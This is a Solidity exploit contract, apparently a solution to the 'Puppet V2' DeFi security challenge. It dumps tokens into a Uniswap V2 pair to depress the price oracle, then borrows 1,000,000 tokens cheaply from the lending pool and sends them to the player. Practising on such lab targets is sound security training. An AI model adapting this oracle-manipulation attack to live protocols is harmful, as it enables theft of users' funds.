// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./PuppetV2Pool.sol";

interface UniswapV2Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface ERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address dst, uint wad) external returns (bool);
    function balanceOf(address account) external returns (uint256);
}

interface WETH9 is ERC20 {
    function deposit() external payable;
}

contract AttackPuppetV2 {
    UniswapV2Router router;
    PuppetV2Pool pool;
    address player;

    uint256 constant SELL_AMOUNT = 10_000 ether;
    uint256 constant STEAL_AMOUNT = 1_000_000 ether;
    ERC20 token;
    WETH9 WETH;

    constructor(
        UniswapV2Router _router, 
        PuppetV2Pool _pool, 
        address _player,
        ERC20 _token,
        WETH9 _weth
    ) public {
        router = _router;
        pool = _pool;
        player = _player;
        token = _token;
        WETH = _weth;
    }

    function attack() payable external {
        require(token.balanceOf(address(this)) >= SELL_AMOUNT, "Not enough tokens to start attack!");
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(WETH);

        token.approve(address(router), SELL_AMOUNT);

        router.swapExactTokensForTokens(
            SELL_AMOUNT,
            0,
            path,
            address(this),
            block.timestamp + 1 days
        );

        WETH.deposit{value: address(this).balance}();

        uint256 requiredDeposit = pool.calculateDepositOfWETHRequired(STEAL_AMOUNT);
       
        require(WETH.balanceOf(address(this)) >= requiredDeposit, "Not enough ether to finalise attack!");
        WETH.approve(address(pool), requiredDeposit);

        pool.borrow(STEAL_AMOUNT);

        token.transfer(player, STEAL_AMOUNT);
        
    }
}
